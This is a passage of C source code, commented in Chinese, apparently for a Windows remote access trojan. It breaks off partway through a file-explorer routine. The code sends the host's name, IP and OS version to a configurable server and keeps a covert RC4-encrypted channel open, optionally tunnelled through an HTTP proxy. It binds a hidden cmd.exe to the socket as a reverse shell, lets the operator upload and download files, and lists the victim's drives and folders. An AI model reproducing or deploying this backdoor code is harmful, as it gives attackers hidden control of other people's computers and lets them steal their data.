#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <direct.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>
#include <io.h>
#include <direct.h>
#include <shellapi.h>
#include "base64.h"
#include "rc4.h"
#define MAX_SIZE 1460
#define HTTP_TRAN_MAX_SIZE 81920
#define KEY "46883f43e3202a298b9a51f863e54a54"

char SERVER_IP[50]="SERVER_IP:";                 //默认回连IP
char SERVER_PORT[50]="SERVER_PORT:";             //默认回连端口
char PROXY_IP[50]="PROXY_IP:";                   //默认代理服务器IP
char PROXY_PORT[50]="PROXY_PORT:";               //默认代理服务器端口
char PROXY_USERNAME[50]="PROXY_USERNAME:";       //默认代理服务器登陆账号
char PROXY_PASSWORD[50]="PROXY_PASSWORD:";       //默认代理服务器登陆密码
char _RC4_KEY[256]="RC4_KEY:69d1901efbe0de05c63a9caa8ea76cd9";     //通讯加密密钥

#pragma comment(lib,"ws2_32.lib")

char *HTTP_Header_Pass="POST http://%s:%d/ HTTP/1.1\r\nContent-Length: %d\r\nProxy-Connection: Keep-Alive\r\n"
                       "Proxy-Authorization: Basic %s\r\n\r\n";
char *HTTP_Header_NoPass="POST http://%s:%d/ HTTP/1.1\r\nContent-Length: %d\r\nProxy-Connection: Keep-Alive\r\n\r\n";

char *ProxyPass_base64=NULL;
char Server_IP[20],Proxy_IP[20],Proxy_Username[20],Proxy_Password[20];
unsigned char RC4_KEY[256],S_box[256];
int Server_Port,Proxy_Port,Need_Pass=0;
int disconnect=0;       //断开连接标识
int HTTP_connect_flag=0;        //通过HTTP连接标识
int reconnect_number=10;        //尝试重新连接十次
int time_interval=5000;         //重连时间间隔5秒
int try_reconnect_number=0;     //已尝试重连次数
CRITICAL_SECTION CRI_SOC;       //申明一个临界区对象

typedef struct
{
    char key[33];
    int order;     //1:接收命令,2:接收文件
    int HTTP_Proxy;     //0:不通过HTTP代理连接,1:通过HTTP代理连接
    char name[255];
    char ip[20];
    char OS[100];
} ComputerInfo;

typedef struct
{
    int end_flag;      //结束标识,1:还未结束,0:已经结束
    int type_flag;     //1:磁盘驱动列表,2:文件夹列表,3:文件列表
    char content[1452];
} FileExplorerStruct;

ComputerInfo CI;

SOCKET ConnectToServer(struct sockaddr_in *addr,char *ip,int port)
{
    WSADATA wsa;
    SOCKET ServerSocket=INVALID_SOCKET;
    struct sockaddr_in ServerAddress;

    memset(&ServerAddress,NULL,sizeof(struct sockaddr_in));
    ServerAddress.sin_addr.s_addr=inet_addr(ip);
    ServerAddress.sin_family=AF_INET;
    ServerAddress.sin_port=htons(port);

    if(WSAStartup(MAKEWORD(2,2),&wsa)!=0)
    {
        return ServerSocket;
    }

    if((ServerSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        return ServerSocket;
    }

    if(connect(ServerSocket,(struct sockaddr *)&ServerAddress,sizeof(struct sockaddr_in))!=0)
    {
        closesocket(ServerSocket);
        ServerSocket=INVALID_SOCKET;
        return ServerSocket;
    }

    memcpy(addr,&ServerAddress,sizeof(struct sockaddr_in));

    return ServerSocket;
}

int Send_HTTP_Header(SOCKET ProxySocket,int Content_Length,int NeedPass)
{
    char SendBuffer[MAX_SIZE];

    memset(SendBuffer,NULL,sizeof(SendBuffer));

    if(NeedPass)
    {
        //需要验证
        sprintf(SendBuffer,HTTP_Header_Pass,Server_IP,Server_Port,Content_Length,ProxyPass_base64);
    }
    else
    {
        //代理不需要验证
        sprintf(SendBuffer,HTTP_Header_NoPass,Server_IP,Server_Port,Content_Length);
    }

    if(send(ProxySocket,SendBuffer,strlen(SendBuffer),0)<=0)
    {
        //printf("HTTP_Header发送失败.\n");
        return -1;
    }
    return 0;
}

int SendComputerInfo(SOCKET soc,char *ServerIP,int ServerPort,char *ProxyPass)
{
    char SendBuffer[MAX_SIZE],cmdbuffer[MAX_SIZE];
    PHOSTENT hostinfo;
    char *pStart=NULL;
    HANDLE hReadPipe1,hWritePipe1; //用来创建管道
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    unsigned long lBytesRead=1;

    memset(&si,NULL,sizeof(STARTUPINFO));
    memset(&pi,NULL,sizeof(PROCESS_INFORMATION));
    memset(&sa,NULL,sizeof(SECURITY_ATTRIBUTES));
    memset(&CI,NULL,sizeof(ComputerInfo));
    memset(SendBuffer,NULL,sizeof(SendBuffer));
    memset(cmdbuffer,NULL,sizeof(cmdbuffer));
    strcat(CI.key,KEY);
    if(HTTP_connect_flag) CI.HTTP_Proxy=1;

    gethostname(CI.name,255);     //获取计算机名
    if((hostinfo = gethostbyname(CI.name))!=NULL)
        strcat(CI.ip,inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list));   //获取计算机IP

    sa.nLength=sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor=0;
    sa.bInheritHandle=true;
    si.cb=sizeof(STARTUPINFO);
    si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow=SW_HIDE;
    if(CreatePipe(&hReadPipe1,&hWritePipe1,&sa,0))//创建匿名管道
    {
        si.hStdOutput = si.hStdError = hWritePipe1;
        CreateProcess(NULL,"cmd.exe /c ver",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
        ReadFile(hReadPipe1,cmdbuffer,sizeof(cmdbuffer)-1,&lBytesRead,0);//读取管道里的数据
        memset(cmdbuffer,NULL,sizeof(cmdbuffer));
        ReadFile(hReadPipe1,cmdbuffer,sizeof(cmdbuffer)-1,&lBytesRead,0);//读取管道里的数据
        TerminateProcess(pi.hProcess,-1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hReadPipe1);
        CloseHandle(hWritePipe1);
    }

    strcat(CI.OS,cmdbuffer);     //获取操作系统信息

    if(CI.HTTP_Proxy)
        if(ProxyPass!=NULL)
            sprintf(SendBuffer,HTTP_Header_Pass,ServerIP,ServerPort,sizeof(ComputerInfo)+1,ProxyPass);
        else
            sprintf(SendBuffer,HTTP_Header_NoPass,ServerIP,ServerPort,sizeof(ComputerInfo)+1);
    pStart=SendBuffer+strlen(SendBuffer);
    memcpy(pStart,(char *)&CI,sizeof(ComputerInfo));

    if(CI.HTTP_Proxy)
        if(Send_HTTP_Header(soc,sizeof(ComputerInfo),Need_Pass)!=0)
            return -1;
    rc4_crypt(S_box,(unsigned char *)&CI,sizeof(ComputerInfo));     //加密
    if(send(soc,(char *)&CI,sizeof(ComputerInfo),0)<=0)
        return -1;
    rc4_crypt(S_box,(unsigned char *)&CI,sizeof(ComputerInfo));     //解密

    return 0;
}

DWORD WINAPI Keep_Alive(LPVOID Parameter)
{
    //HTTP隧道通讯需要利用心跳机制保证连接不被断开
    SOCKET ProxySocket=*(SOCKET *)Parameter;
    char str[20]="Keep-Alive:";
    int SendSize=0;

    SendSize=strlen(str);
    rc4_crypt(S_box,(unsigned char *)str,SendSize);
    while(1)
    {
        if(disconnect) return -1;
        Sleep(20000);         //二十秒一次心跳
        EnterCriticalSection(&CRI_SOC);
        if(Send_HTTP_Header(ProxySocket,SendSize,Need_Pass)!=0)
        {
            //printf("连接断开.\n");
            LeaveCriticalSection(&CRI_SOC);
            return -1;
        }
        if(send(ProxySocket,str,SendSize,0)<=0)
        {
            //printf("连接断开.\n");
            LeaveCriticalSection(&CRI_SOC);
            return -1;
        }
        LeaveCriticalSection(&CRI_SOC);
    }
    return 0;
}

DWORD WINAPI Execute_Command(LPVOID Parameter)
{
    char SendBuffer[MAX_SIZE],RecvBuffer[MAX_SIZE+1];
    SOCKET ServerSocket=INVALID_SOCKET;
    struct sockaddr_in ServerAddress,TempAddress;
    HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;       //两个匿名管道
    int RecvSize=0;
    unsigned long lBytesRead=0;
    int SocketTimeOut,n,RecvHTTPflag=1;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    fd_set read_fd,write_fd;
    struct timeval WaitTimeOut;
    ComputerInfo _CI;

    memset(&ServerAddress,NULL,sizeof(struct sockaddr_in));
    memset(&TempAddress,NULL,sizeof(struct sockaddr_in));
    memset(&WaitTimeOut,NULL,sizeof(struct timeval));
    memset(&_CI,NULL,sizeof(ComputerInfo));
    memset(&si,NULL,sizeof(STARTUPINFO));
    memset(&sa,NULL,sizeof(SECURITY_ATTRIBUTES));
    memset(&pi,NULL,sizeof(PROCESS_INFORMATION));

    //首先ServerSocket连接到服务端
    if(CI.HTTP_Proxy)
    {
        ServerSocket=ConnectToServer(&ServerAddress,Proxy_IP,Proxy_Port);   //连接到代理服务器
    }
    else
    {
        ServerSocket=ConnectToServer(&ServerAddress,Server_IP,Server_Port);  //连接到服务端
    }
    //发送验证消息
    _CI=CI;
    _CI.order=1;
    if(_CI.HTTP_Proxy)
    {
        _CI.HTTP_Proxy=1;
        if(Send_HTTP_Header(ServerSocket,sizeof(ComputerInfo),Need_Pass)!=0)
        {
            closesocket(ServerSocket);
            return -1;
        }
    }
    rc4_crypt(S_box,(unsigned char *)&_CI,sizeof(ComputerInfo));          //加密主机信息
    if(send(ServerSocket,(char *)&_CI,sizeof(ComputerInfo),0)<=0)
    {
        //向服务端发送验证信息
        closesocket(ServerSocket);
        return -1;
    }
    rc4_crypt(S_box,(unsigned char *)&_CI,sizeof(ComputerInfo));         //解密
    if(CI.HTTP_Proxy)
    {
        //通过HTTP隧道则需要接收HTTP反馈信息
        //设置套接字接收超时
        SocketTimeOut=60000;
        setsockopt(ServerSocket,SOL_SOCKET,SO_RCVTIMEO,(char *)&SocketTimeOut,sizeof(int));
        while(1)
        {
            memset(RecvBuffer,NULL,sizeof(RecvBuffer));
            if(recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
            {
                closesocket(ServerSocket);
                return -1;
            }
            if(strstr(RecvBuffer,"Hello"))
                break;
        }
        SocketTimeOut=0;
        setsockopt(ServerSocket,SOL_SOCKET,SO_RCVTIMEO,(char *)&SocketTimeOut,sizeof(int));
    }

    //创建两个匿名管道
    sa.nLength=sizeof(sa);
    sa.lpSecurityDescriptor=0;
    sa.bInheritHandle=true;
    if(!CreatePipe(&hReadPipe1,&hWritePipe1,&sa,0))
        return -1;
    if(!CreatePipe(&hReadPipe2,&hWritePipe2,&sa,0))
        return -1;
    //用管道与cmd.exe绑定
    GetStartupInfo(&si);
    si.cb=sizeof(si);
    si.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    si.hStdInput=hReadPipe1;
    si.hStdOutput=si.hStdError=hWritePipe2;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,1,NULL,NULL,NULL,&si,&pi);
    WaitTimeOut.tv_sec=1;
    WaitTimeOut.tv_usec=0;
    while(1)
    {
        //接收命令，执行命令，返回结果，异步执行
        if(disconnect)
        {
            closesocket(ServerSocket);
            TerminateProcess(pi.hProcess,-1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hReadPipe1);
            CloseHandle(hWritePipe1);
            CloseHandle(hReadPipe2);
            CloseHandle(hWritePipe2);
            return -1;
        }
        FD_ZERO(&read_fd);
        FD_ZERO(&write_fd);
        FD_SET(ServerSocket,&read_fd);
        FD_SET(ServerSocket,&write_fd);
        if(select(-1,&read_fd,&write_fd,NULL,&WaitTimeOut)>0)
        {
            if(FD_ISSET(ServerSocket,&read_fd))
            {
                //服务端有命令发送过来
                memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                memset(SendBuffer,NULL,sizeof(SendBuffer));
                if((RecvSize=recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0))<=0)
                {
                    //puts("从服务端接收命令失败.");
                    closesocket(ServerSocket);
                    TerminateProcess(pi.hProcess,-1);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    CloseHandle(hReadPipe1);
                    CloseHandle(hWritePipe1);
                    CloseHandle(hReadPipe2);
                    CloseHandle(hWritePipe2);
                    return -1;
                }

                rc4_crypt(S_box,(unsigned char *)RecvBuffer,RecvSize);   //解密
                //printf("Command:%s\n",SendBuffer);
                if(!WriteFile(hWritePipe1,RecvBuffer,strlen(RecvBuffer),&lBytesRead,0))
                {
                    closesocket(ServerSocket);
                    TerminateProcess(pi.hProcess,-1);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    CloseHandle(hReadPipe1);
                    CloseHandle(hWritePipe1);
                    CloseHandle(hReadPipe2);
                    CloseHandle(hWritePipe2);
                    return -1;
                }
            }
            if(FD_ISSET(ServerSocket,&write_fd))
            {
                if(PeekNamedPipe(hReadPipe2,RecvBuffer,sizeof(RecvBuffer)-2,&lBytesRead,0,0) && lBytesRead)
                {
                    //和cmd.exe绑定的管道中有数据发来
                    memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                    memset(SendBuffer,NULL,sizeof(SendBuffer));
                    if(!ReadFile(hReadPipe2,RecvBuffer,sizeof(RecvBuffer)-2,&lBytesRead,0))
                    {
                        closesocket(ServerSocket);
                        TerminateProcess(pi.hProcess,-1);
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        CloseHandle(hReadPipe1);
                        CloseHandle(hWritePipe1);
                        CloseHandle(hReadPipe2);
                        CloseHandle(hWritePipe2);
                        return -1;
                    }
                    memcpy(SendBuffer,RecvBuffer,MAX_SIZE-1);
                    rc4_crypt(S_box,(unsigned char *)SendBuffer,sizeof(SendBuffer));   //加密命令执行结果
                    //若通过HTTP代理首先发送HTTP_Header
                    if(CI.HTTP_Proxy)
                        if(Send_HTTP_Header(ServerSocket,sizeof(SendBuffer),Need_Pass)!=0)
                        {
                            closesocket(ServerSocket);
                            TerminateProcess(pi.hProcess,-1);
                            CloseHandle(pi.hProcess);
                            CloseHandle(pi.hThread);
                            CloseHandle(hReadPipe1);
                            CloseHandle(hWritePipe1);
                            CloseHandle(hReadPipe2);
                            CloseHandle(hWritePipe2);
                            return -1;
                        }
                    if(send(ServerSocket,SendBuffer,sizeof(SendBuffer),0)<=0)
                    {
                        //puts("发送结果至服务器失败.");
                        closesocket(ServerSocket);
                        TerminateProcess(pi.hProcess,-1);
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        CloseHandle(hReadPipe1);
                        CloseHandle(hWritePipe1);
                        CloseHandle(hReadPipe2);
                        CloseHandle(hWritePipe2);
                        return -1;
                    }
                    if(CI.HTTP_Proxy)
                        for(n=0; n<10; n++)
                        {
                            //过滤HTTP_Header
                            memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                            if(recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
                            {
                                //puts("从服务端接收命令失败.");
                                closesocket(ServerSocket);
                                TerminateProcess(pi.hProcess,-1);
                                CloseHandle(pi.hProcess);
                                CloseHandle(pi.hThread);
                                CloseHandle(hReadPipe1);
                                CloseHandle(hWritePipe1);
                                CloseHandle(hReadPipe2);
                                CloseHandle(hWritePipe2);
                                return -1;
                            }
                            if(!strcmp(RecvBuffer,"Continue"))
                                break;
                        }
                }
                else
                    Sleep(10);
            }
        }
    }
    return 0;
}

int mkdirs(char *path,FILE **file)
{
    char *tmp=NULL,tmp_path[255];

    if (access(path,0)==0)
    {
        //printf("已存在此文件\n");
        goto skip;
    }
    tmp=path;
    while(1)
    {
        tmp=strchr(tmp,'\\');
        if(tmp==NULL)
            break;
        memset(tmp_path,NULL,sizeof(tmp_path));
        memcpy(tmp_path,path,tmp-path);
        if (access(tmp_path,0)!=0)
        {
            //此目录地址不存在
            if(mkdir(tmp_path)!=0)
                return -1;         //创建目录出错
        }
        tmp++;
    }
skip:
    if((*file=fopen(path,"wb+"))==NULL)
        return -1;

    return 0;
}

typedef struct
{
    char ip[20];
    int port;
    FILE *file;
    SOCKET TranSocket;
    SOCKET ServerSocket;
} TempStruct;

DWORD WINAPI Recv_File(LPVOID Parameter)
{
    TempStruct RF=*(TempStruct *)Parameter;
    char RecvBuffer[MAX_SIZE+1],*pStart=NULL;
    ComputerInfo _CI;
    DWORD RecvSize=0,flags=0,n;
    WSAOVERLAPPED overlap;
    WSABUF WSABuffer;
    WSAEVENT WSAEvent;

    memset(&_CI,NULL,sizeof(ComputerInfo));
    memset(&overlap,NULL,sizeof(WSAOVERLAPPED));

    if (RF.file==NULL)
    {
        //printf("文件指针不可用.\n");
        return -1;
    }

    _CI=CI;
    _CI.order=2;          //上传文件
    if(_CI.HTTP_Proxy)
    {
        if(Send_HTTP_Header(RF.TranSocket,sizeof(ComputerInfo),Need_Pass)!=0)
        {
            //printf("接收文件失败.(发送验证信息失败)\n");
            closesocket(RF.TranSocket);
            fclose(RF.file);
            return -1;
        }
    }
    rc4_crypt(S_box,(unsigned char *)&_CI,sizeof(ComputerInfo));
    if(send(RF.TranSocket,(char *)&_CI,sizeof(ComputerInfo),0)<=0)
    {
        //向服务端发送验证信息
        fclose(RF.file);
        closesocket(RF.TranSocket);
        return -1;
    }
    rc4_crypt(S_box,(unsigned char *)&_CI,sizeof(ComputerInfo));
    if(_CI.HTTP_Proxy)
        for(n=0; n<=10; n++)
        {
            if(recv(RF.TranSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
            {
                //printf("接收文件失败.(接收认证结果失败)\n");
                closesocket(RF.TranSocket);
                fclose(RF.file);
                return -1;
            }
            pStart=strstr(RecvBuffer,"Hello!");
            if(pStart!=NULL)
                break;
        }
    if(_CI.HTTP_Proxy)
    {
        if(Send_HTTP_Header(RF.ServerSocket,18,Need_Pass)!=0)
        {
            //printf("接收文件失败.(发送允许上传信息失败)\n");
            closesocket(RF.TranSocket);
            fclose(RF.file);
            return -1;
        }
    }
    //允许服务端开始上传文件
    char str[50]="CreateFileSuccess:";
    rc4_crypt(S_box,(unsigned char *)str,strlen(str));
    if(send(RF.ServerSocket,str,strlen(str),0)<=0)
    {
        fclose(RF.file);
        closesocket(RF.TranSocket);
        return -1;
    }

    WSAEvent=overlap.hEvent=WSACreateEvent();
    WSABuffer.len=sizeof(RecvBuffer)-1;
    WSABuffer.buf=RecvBuffer;
    while(1)
    {
        if(disconnect)
        {
            closesocket(RF.TranSocket);
            fclose(RF.file);
            return -1;
        }
        memset(RecvBuffer,NULL,sizeof(RecvBuffer));
        WSARecv(RF.TranSocket,&WSABuffer,1,&RecvSize,&flags,&overlap,NULL);
        WSAWaitForMultipleEvents(1,&WSAEvent,FALSE,WSA_INFINITE,FALSE);
        WSAGetOverlappedResult(RF.TranSocket,&overlap,&RecvSize,TRUE,&flags);
        WSAResetEvent(WSAEvent);
        if (RecvSize<1)
        {
            break;
        }
        //MessageBox(NULL,"pause","pause",MB_OK);
        fwrite(RecvBuffer,sizeof(char),RecvSize,RF.file);
        fflush(RF.file);
    }
    fclose(RF.file);
    WSACloseEvent(WSAEvent);
    closesocket(RF.TranSocket);
    //printf("文件上传完成.\n");

    return 0;
}

DWORD WINAPI Send_File(LPVOID Parameter)
{
    TempStruct SF=*(TempStruct *)Parameter;
    char SendBuffer[MAX_SIZE],HTTPSendBuffer[HTTP_TRAN_MAX_SIZE],RecvBuffer[MAX_SIZE+1],*pStart=NULL;
    int ReadSize=0,n;
    ComputerInfo _CI;

    memset(&_CI,NULL,sizeof(ComputerInfo));

    if (SF.file==NULL)
    {
        //printf("文件指针不可用.\n");
        return -1;
    }
    _CI=CI;
    _CI.order=3;    //下载文件
    if(_CI.HTTP_Proxy)
    {
        if(Send_HTTP_Header(SF.TranSocket,sizeof(ComputerInfo),Need_Pass)!=0)
        {
            //printf("接收文件失败.(发送验证信息失败)\n");
            closesocket(SF.TranSocket);
            fclose(SF.file);
            return -1;
        }
    }
    rc4_crypt(S_box,(unsigned char *)&_CI,sizeof(ComputerInfo));
    if(send(SF.TranSocket,(char *)&_CI,sizeof(ComputerInfo),0)<=0)
    {
        //发送验证信息
        fclose(SF.file);
        closesocket(SF.TranSocket);
        return -1;
    }
    rc4_crypt(S_box,(unsigned char *)&_CI,sizeof(ComputerInfo));
    if(_CI.HTTP_Proxy)
        for(n=0; n<=10; n++)
        {
            //接收认证成功消息
            memset(RecvBuffer,NULL,sizeof(RecvBuffer));
            if(recv(SF.TranSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
            {
                //printf("发送文件失败.(认证失败)\n");
                closesocket(SF.TranSocket);
                fclose(SF.file);
                return -1;
            }
            pStart=strstr(RecvBuffer,"Hello!");
            if(pStart!=NULL)
                break;
        }
    while(!feof(SF.file))
    {
        if(disconnect)
        {
            closesocket(SF.TranSocket);
            fclose(SF.file);
            return -1;
        }
        memset(SendBuffer,NULL,sizeof(SendBuffer));
        if(_CI.HTTP_Proxy)
            ReadSize=fread(HTTPSendBuffer,sizeof(char),sizeof(HTTPSendBuffer),SF.file);  //HTTP隧道的文件读取方式
        else
            ReadSize=fread(SendBuffer,sizeof(char),sizeof(SendBuffer),SF.file);
        if(ReadSize<1)
        {
            //printf("文件下载失败.\n");
            fclose(SF.file);
            closesocket(SF.TranSocket);
            return -1;
        }
        if(_CI.HTTP_Proxy)
        {
            //HTTP隧道文件传输方式，先发送HTTP_Header
            if(Send_HTTP_Header(SF.TranSocket,ReadSize,Need_Pass)!=0)
            {
                //printf("发送文件失败.\n");
                closesocket(SF.TranSocket);
                fclose(SF.file);
                return -1;
            }
            //发送文件数据
            if(send(SF.TranSocket,HTTPSendBuffer,ReadSize,0)<=0)
                break;
        }
        else
        {
            //非隧道时的文件传输方式
            if(send(SF.TranSocket,SendBuffer,ReadSize,0)<=0)
                break;
        }

        if(_CI.HTTP_Proxy)
            for(n=0; n<=10; n++)  //十次之内需要接收到继续消息，否则默认继续
            {
                //接收反馈的HTTP信息,防止数据填满缓冲区
                memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                if(recv(SF.TranSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
                {
                    //printf("发送文件失败.(发送验证信息失败)\n");
                    closesocket(SF.TranSocket);
                    fclose(SF.file);
                    return -1;
                }
                pStart=strstr(RecvBuffer,"Continue");
                if(pStart!=NULL)
                    break;
            }

    }
    fclose(SF.file);
    closesocket(SF.TranSocket);
    //printf("文件下载完成.\n");

    return 0;
}

int achieve_file_list(char *_path,char **folders_buffer,char **files_buffer)
{
    int i=0;
    char tmp_str[255],path[MAX_SIZE];
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind;

    *folders_buffer=NULL;
    *files_buffer=NULL;
    memset(&FindFileData,NULL,sizeof(WIN32_FIND_DATA));
    memset(path,NULL,sizeof(path));

    strcat(path,_path);
    if(path[strlen(path)-1]!='\\')
        strcat(path,"\\");
    strcat(path,"*.*");
    hFind=FindFirstFile(path,&FindFileData);
    if(hFind==INVALID_HANDLE_VALUE)  return -1;   //此目录下为空
    do
    {
        if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            //表示扫描到文件夹
            if(*folders_buffer==NULL)
            {
                if((*folders_buffer=(char *)malloc(strlen(FindFileData.cFileName)+1))==NULL)
                    return -1;
                memset(*folders_buffer,NULL,strlen(FindFileData.cFileName)+1);
            }
            else
            {
                i=strlen(*folders_buffer);
                *folders_buffer=(char *)realloc(*folders_buffer,i+strlen(FindFileData.cFileName)+2);
                memset(*folders_buffer+i,NULL,strlen(FindFileData.cFileName)+2);
                if((*folders_buffer)[strlen(*folders_buffer)-1]!=',')
                {
                    strcat(*folders_buffer,",");
                }
            }

            strcat(*folders_buffer,FindFileData.cFileName);
        }
        else
        {
            //表示扫描到文件
            if(*files_buffer==NULL)
            {
                if((*files_buffer=(char *)malloc(strlen(FindFileData.cFileName)+1))==NULL)
                    return -1;
                memset(*files_buffer,NULL,strlen(FindFileData.cFileName)+1);
            }
            else
            {
                i=strlen(*files_buffer);
                *files_buffer=(char *)realloc(*files_buffer,i+strlen(FindFileData.cFileName)+2);
                memset(*files_buffer+i,NULL,strlen(FindFileData.cFileName)+2);
                if((*files_buffer)[strlen(*files_buffer)-1]!=',')
                {
                    strcat(*files_buffer,",");
                }
            }
            strcat(*files_buffer,FindFileData.cFileName);
        }
    }
    while(FindNextFile(hFind,&FindFileData));
    //MessageBox(NULL,*folders_buffer,"1",MB_OK);

    return 0;
}

DWORD WINAPI file_explorer(LPVOID Parameter)
{
    char RecvBuffer[MAX_SIZE+1],Drives[MAX_SIZE];
    char *p=NULL,CurrDrive[10],*folders_buffer=NULL,*files_buffer=NULL;
    char *pStart=NULL,*pEnd=NULL,*oldfilename=NULL;
    SOCKET ServerSocket=INVALID_SOCKET;
    struct sockaddr_in ServerAddress;
    HANDLE hThread;
    int send_flag=0,k,i,find_next_file=0,RecvSize=0;
    int SocketTimeOut=60000,n,RecvHTTPflag=1;
    fd_set readfd;
    struct timeval WaitTimeOut;
    ComputerInfo _CI;
    FileExplorerStruct FES;

    memset(&ServerAddress,NULL,sizeof(struct sockaddr_in));
    memset(&WaitTimeOut,NULL,sizeof(struct timeval));
    memset(&_CI,NULL,sizeof(ComputerInfo));
    memset(Drives,NULL,sizeof(Drives));
    memset(CurrDrive,NULL,sizeof(CurrDrive));
    memset(&FES,NULL,sizeof(FileExplorerStruct));
    memset(RecvBuffer,NULL,sizeof(RecvBuffer));

    //首先ServerSocket连接到服务端
    if(CI.HTTP_Proxy)
    {
        ServerSocket=ConnectToServer(&ServerAddress,Proxy_IP,Proxy_Port);   //连接到代理服务器
    }
    else
    {
        ServerSocket=ConnectToServer(&ServerAddress,Server_IP,Server_Port);  //连接到服务端
    }
    //发送验证消息
    _CI=CI;
    _CI.order=5;
    if(_CI.HTTP_Proxy)
    {
        _CI.HTTP_Proxy=1;
        if(Send_HTTP_Header(ServerSocket,sizeof(ComputerInfo),Need_Pass)!=0)
        {
            closesocket(ServerSocket);
            return -1;
        }
    }
    rc4_crypt(S_box,(unsigned char *)&_CI,sizeof(ComputerInfo));          //加密主机信息
    if(send(ServerSocket,(char *)&_CI,sizeof(ComputerInfo),0)<=0)
    {
        //向服务端发送验证信息
        closesocket(ServerSocket);
        return -1;
    }
    rc4_crypt(S_box,(unsigned char *)&_CI,sizeof(ComputerInfo));         //解密
    if(CI.HTTP_Proxy)
    {
        //通过HTTP隧道则需要接收HTTP反馈信息
        setsockopt(ServerSocket,SOL_SOCKET,SO_RCVTIMEO,(char *)&SocketTimeOut,sizeof(int));
        while(1)
        {
            memset(RecvBuffer,NULL,sizeof(RecvBuffer));
            if(recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
            {
                closesocket(ServerSocket);
                return -1;
            }
            if(strstr(RecvBuffer,"Hello"))
                break;
        }
        SocketTimeOut=0;
        setsockopt(ServerSocket,SOL_SOCKET,SO_RCVTIMEO,(char *)&SocketTimeOut,sizeof(int));
    }

    GetLogicalDriveStrings(sizeof(Drives),Drives);
    for(k=0,p=CurrDrive,i=0; k<2; i++)
    {
        if(Drives[i]!=NULL)
        {
            k=0;
            *p=Drives[i];
            p++;
        }
        else
        {
            k++;
            p=CurrDrive;
            if(GetVolumeInformation(p,0,0,0,0,0,0,0))
            {
                //该设备已就绪
                if(FES.content[0]!=NULL)
                    strcat(FES.content,",");
                strcat(FES.content,p);
            }
            memset(CurrDrive,NULL,sizeof(CurrDrive));
        }
    }
    FES.end_flag=0;
    FES.type_flag=1;
    //若通过HTTP代理首先发送HTTP_Header
    if(CI.HTTP_Proxy)
        if(Send_HTTP_Header(ServerSocket,sizeof(FileExplorerStruct),Need_Pass)!=0)
            return -1;
    //MessageBox(NULL,FES.content,"1",MB_OK);
    rc4_crypt(S_box,(unsigned char *)&FES,sizeof(FileExplorerStruct));
    if(send(ServerSocket,(char *)&FES,sizeof(FileExplorerStruct),0)<=0)
    {
        //发送磁盘列表
        closesocket(ServerSocket);
        return -1;
    }
    if(CI.HTTP_Proxy)
        for(n=0; n<10; n++)
        {
            //过滤HTTP_Header
            memset(RecvBuffer,NULL,sizeof(RecvBuffer));
            if(recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
            {
                //puts("从服务端接收命令失败.");
                closesocket(ServerSocket);
                return -1;
            }
            if(!strcmp(RecvBuffer,"Continue"))
                break;
        }
    memset(&FES,NULL,sizeof(FileExplorerStruct));
    getcwd(FES.content,sizeof(FES.content));
    FES.end_flag=0;
    FES.type_flag=0;
    if(CI.HTTP_Proxy)
        if(Send_HTTP_Header(ServerSocket,sizeof(FileExplorerStruct),Need_Pass)!=0)
            return -1;
    rc4_crypt(S_box,(unsigned char *)&FES,sizeof(FileExplorerStruct));
    if(send(ServerSocket,(char *)&FES,sizeof(FileExplorerStruct),0)<=0)
    {
        //发送当前路径
        closesocket(ServerSocket);
        return -1;
    }
    if(CI.HTTP_Proxy)
        for(n=0; n<10; n++)
        {
            //过滤HTTP_Header
            memset(RecvBuffer,NULL,sizeof(RecvBuffer));
            if(recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
            {
                //puts("从服务端接收命令失败.");
                closesocket(ServerSocket);
                return -1;
            }
            if(!strcmp(RecvBuffer,"Continue"))
                break;
        }
    //MessageBox(NULL,FES.content,"1",MB_OK);
    WaitTimeOut.tv_sec=1;
    WaitTimeOut.tv_usec=0;
    while(1)
    {
        FD_ZERO(&readfd);
        FD_SET(ServerSocket,&readfd);
        memset(RecvBuffer,NULL,sizeof(RecvBuffer));
        memset(&FES,NULL,sizeof(FileExplorerStruct));
        if(select(-1,&readfd,NULL,NULL,&WaitTimeOut)<1)
            continue;
        if(FD_ISSET(ServerSocket,&readfd))
        {
            if((RecvSize=recv(ServerSocket,RecvBuffer,sizeof(RecvBuffer)-1,0))<=0)
            {
